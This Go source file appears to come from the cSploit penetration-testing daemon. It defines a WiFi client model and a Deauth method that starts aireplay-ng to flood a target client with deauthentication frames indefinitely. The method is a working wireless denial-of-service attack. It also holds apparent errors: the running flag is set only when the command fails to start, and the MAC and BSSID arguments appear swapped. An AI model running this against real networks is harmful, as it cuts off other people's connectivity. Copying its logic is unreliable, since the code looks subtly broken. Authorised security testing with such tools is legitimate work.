package models

import (
	"github.com/cSploit/daemon/models/internal"
	"github.com/cSploit/daemon/tools/aircrack/attacks"
	"os/exec"
	"time"
)

// A wifi client ( courtesy of aircrack )
type Client struct {
	internal.Base
	// MAC address
	Station string `json:"station"`
	Power   int    `json:"power"`
	Packets int    `json:"packets"`
	Bssid   string `json:"bssid"`
	Probed  string `json:"probed_essids"`

	Iface   Iface `json:"-"`
	IfaceId uint  `json:"-"`
	Jobs    []Job `json:"-" gorm:"many2many:job_clients"`
}

// DEAUTH infinitely the Client
func (c *Client) Deauth(iface string) (attacks.Attack, error) {
	cmd := exec.Command("aireplay-ng", "-0", "0", "-a", c.Station, "-d", c.Bssid, iface)

	err := cmd.Start() // Do not wait

	cur_atk := attacks.Attack{
		Type:    "Deauth",
		Target:  c.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err != nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	return cur_atk, err
}
